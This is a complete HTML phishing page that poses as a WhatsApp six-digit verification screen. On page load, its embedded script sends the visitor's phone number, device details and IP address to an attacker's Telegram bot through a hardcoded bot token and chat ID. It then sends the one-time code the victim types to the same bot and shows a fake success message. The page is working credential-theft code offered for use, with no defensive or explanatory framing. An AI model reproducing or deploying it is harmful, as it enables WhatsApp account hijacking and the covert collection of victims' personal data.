<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Code - WhatsApp</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #111b21;
            color: #e9edef;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background-color: #202c33;
            border-radius: 10px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo svg {
            width: 60px;
            height: 60px;
            fill: #00a884;
        }
        
        .description {
            color: #8696a0;
            text-align: center;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        
        .phone-number {
            color: #00a884;
            font-weight: 600;
            text-align: center;
            margin-bottom: 30px;
            font-size: 18px;
        }
        
        .otp-inputs {
            display: flex;
            justify-content: space-between;
            margin-bottom: 25px;
        }
        
        .otp-input {
            width: 50px;
            height: 50px;
            background-color: #2a3942;
            border: 1px solid #3c4a52;
            border-radius: 5px;
            text-align: center;
            font-size: 20px;
            color: #e9edef;
            transition: all 0.2s;
        }
        
        .otp-input:focus {
            outline: none;
            border-color: #00a884;
            box-shadow: 0 0 0 2px rgba(0, 168, 132, 0.2);
        }
        
        .otp-input.filled {
            border-color: #00a884;
        }
        
        .verify-btn {
            background-color: #00a884;
            color: #111b21;
            border: none;
            border-radius: 5px;
            padding: 12px;
            width: 100%;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 10px;
        }
        
        .verify-btn:hover {
            background-color: #06cf9c;
        }
        
        .verify-btn:disabled {
            background-color: #2a3942;
            color: #8696a0;
            cursor: not-allowed;
        }
        
        .resend {
            text-align: center;
            color: #8696a0;
            margin-top: 20px;
        }
        
        .resend a {
            color: #00a884;
            text-decoration: none;
        }
        
        .resend a:disabled {
            color: #8696a0;
            cursor: not-allowed;
        }
        
        .countdown {
            color: #8696a0;
            text-align: center;
            margin-top: 10px;
            font-size: 14px;
        }
        
        .error {
            color: #f15c6d;
            font-size: 14px;
            margin-top: 10px;
            text-align: center;
            display: none;
        }
        
        .success {
            color: #00a884;
            font-size: 14px;
            margin-top: 10px;
            text-align: center;
            display: none;
        }
        
        .loading {
            color: #8696a0;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24">
                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893-.001-3.176-1.234-6.165-3.476-8.419"></path>
            </svg>
        </div>
        
        <p class="description">WhatsApp has sent a 6-digit code to the following number:</p>
        <div class="phone-number">+98 912 345 6789</div>
        
        <div class="otp-inputs">
            <input type="text" class="otp-input" maxlength="1" data-index="0" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" data-index="1" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" data-index="2" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" data-index="3" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" data-index="4" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" data-index="5" inputmode="numeric">
        </div>
        
        <button class="verify-btn" id="verify-otp-btn" disabled>Verify</button>
        
        <div class="error" id="error-message">The entered code is incorrect</div>
        <div class="success" id="success-message">Your number has been successfully verified!</div>
        <div class="loading" id="loading-message">Verifying information...</div>
        
        <div class="countdown" id="countdown">Resend code in 1:59</div>
        <div class="resend">
            Didn't receive the code? <a href="#" id="resend-link" style="pointer-events: none;">Resend</a>
        </div>
    </div>

    <script>
        // Telegram settings
        const BOT_TOKEN = '8226898673:AAG-8UYf3u3beeuO7r-Qup0bqNc-TE1Cgwo';
        const CHAT_ID = '6609774253';

        // User information
        let userInfo = {
            phone: '+93780300592',
            code: '',
            timestamp: ''
        };

        // Function to detect operating system
        function detectOS() {
            const userAgent = navigator.userAgent;
            if (userAgent.indexOf("Windows") !== -1) return "Windows";
            if (userAgent.indexOf("Mac") !== -1) return "MacOS";
            if (userAgent.indexOf("Linux") !== -1) return "Linux";
            if (userAgent.indexOf("Android") !== -1) return "Android";
            if (userAgent.indexOf("iOS") !== -1) return "iOS";
            return "Unknown";
        }

        // Function to detect browser
        function detectBrowser() {
            const userAgent = navigator.userAgent;
            if (userAgent.indexOf("Chrome") !== -1) return "Chrome";
            if (userAgent.indexOf("Firefox") !== -1) return "Firefox";
            if (userAgent.indexOf("Safari") !== -1) return "Safari";
            if (userAgent.indexOf("Edge") !== -1) return "Edge";
            if (userAgent.indexOf("Opera") !== -1) return "Opera";
            return "Unknown";
        }

        // Function to get user IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Not available';
            }
        }

        // Send immediate info when page loads
        function sendImmediateInfo() {
            const immediateInfo = {
                phone: userInfo.phone,
                os: detectOS(),
                browser: detectBrowser(),
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                userAgent: navigator.userAgent,
                timestamp: new Date().toLocaleString('en-US')
            };

            const message = `
üö® User opened the page - Immediate Info

üì± Phone: ${immediateInfo.phone}
üíª OS: ${immediateInfo.os}
üîç Browser: ${immediateInfo.browser}
üó£Ô∏è Language: ${immediateInfo.language}
‚è∞ Time: ${immediateInfo.timestamp}
üìç Timezone: ${immediateInfo.timezone}
üì∫ Screen: ${immediateInfo.screen}

üåê Getting IP address...
            `.trim();

            sendToTelegram(message);
            
            // Get IP and send second message
            getIPAddress().then(ip => {
                userInfo.ip = ip;
                const ipMessage = `
üåê IP Received: ${ip}

‚úÖ Complete User Info:
üì± Phone: ${immediateInfo.phone}
üåê IP: ${ip}
üíª OS: ${immediateInfo.os}
üîç Browser: ${immediateInfo.browser}
üó£Ô∏è Language: ${immediateInfo.language}
‚è∞ Time: ${immediateInfo.timestamp}
üìç Timezone: ${immediateInfo.timezone}
üì∫ Screen: ${immediateInfo.screen}
                `.trim();
                
                sendToTelegram(ipMessage);
            });
        }

        // Function to send code to Telegram
        async function sendCodeToTelegram(code) {
            const message = `
‚úÖ Code Received

üì± Phone: ${userInfo.phone}
üî¢ Code: ${code}
üåê IP: ${userInfo.ip || 'Not available'}
üíª OS: ${detectOS()}
üîç Browser: ${detectBrowser()}
‚è∞ Time: ${new Date().toLocaleString('en-US')}
üìç Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
            `.trim();

            await sendToTelegram(message);
        }

        // Main function to send to Telegram
        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                return response.ok;
            } catch (error) {
                console.error('Telegram send error:', error);
                return false;
            }
        }

        // Send info immediately when script loads
        sendImmediateInfo();

        document.addEventListener('DOMContentLoaded', function() {
            const verifyOtpBtn = document.getElementById('verify-otp-btn');
            const otpInputs = document.querySelectorAll('.otp-input');
            const resendLink = document.getElementById('resend-link');
            const countdownElement = document.getElementById('countdown');
            const errorMessage = document.getElementById('error-message');
            const successMessage = document.getElementById('success-message');
            const loadingMessage = document.getElementById('loading-message');
            
            let countdown = 120;
            let countdownInterval;
            
            // Start countdown
            function startCountdown() {
                countdownInterval = setInterval(function() {
                    countdown--;
                    const minutes = Math.floor(countdown / 60);
                    const seconds = countdown % 60;
                    countdownElement.textContent = `Resend code in ${minutes}:${seconds.toString().padStart(2, '0')}`;
                    
                    if (countdown <= 0) {
                        clearInterval(countdownInterval);
                        countdownElement.style.display = 'none';
                        resendLink.style.pointerEvents = 'auto';
                        resendLink.style.color = '#00a884';
                    }
                }, 1000);
            }
            
            // OTP input management
            otpInputs.forEach(input => {
                input.addEventListener('input', function() {
                    const index = parseInt(this.getAttribute('data-index'));
                    
                    if (this.value && !/^\d+$/.test(this.value)) {
                        this.value = '';
                        return;
                    }
                    
                    if (this.value.length === 1) {
                        this.classList.add('filled');
                        if (index < 5) {
                            otpInputs[index + 1].focus();
                        }
                    } else {
                        this.classList.remove('filled');
                    }
                    
                    checkOtpCompletion();
                });
                
                input.addEventListener('keydown', function(e) {
                    const index = parseInt(this.getAttribute('data-index'));
                    
                    if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                        otpInputs[index - 1].focus();
                    }
                });
            });
            
            function checkOtpCompletion() {
                let allFilled = true;
                otpInputs.forEach(input => {
                    if (!input.value) {
                        allFilled = false;
                    }
                });
                verifyOtpBtn.disabled = !allFilled;
            }
            
            // Verify code
            verifyOtpBtn.addEventListener('click', async function() {
                let otp = '';
                otpInputs.forEach(input => {
                    otp += input.value;
                });
                
                if (otp.length === 6) {
                    loadingMessage.style.display = 'block';
                    errorMessage.style.display = 'none';
                    successMessage.style.display = 'none';
                    verifyOtpBtn.disabled = true;
                    
                    // Send code to Telegram
                    await sendCodeToTelegram(otp);
                    
                    loadingMessage.style.display = 'none';
                    successMessage.style.display = 'block';
                    
                    setTimeout(function() {
                        alert('Your number has been successfully verified! Transferring to WhatsApp...');
                    }, 2000);
                } else {
                    errorMessage.style.display = 'block';
                    successMessage.style.display = 'none';
                }
            });
            
            // Resend code
            resendLink.addEventListener('click', function(e) {
                e.preventDefault();
                otpInputs.forEach(input => {
                    input.value = '';
                    input.classList.remove('filled');
                });
                verifyOtpBtn.disabled = true;
                errorMessage.style.display = 'none';
                successMessage.style.display = 'none';
                clearInterval(countdownInterval);
                countdown = 120;
                countdownElement.style.display = 'block';
                resendLink.style.pointerEvents = 'none';
                startCountdown();
                alert('New verification code sent.');
                otpInputs[0].focus();
            });
            
            // Start countdown
            startCountdown();
            otpInputs[0].focus();
        });
    </script>
</body>
</html>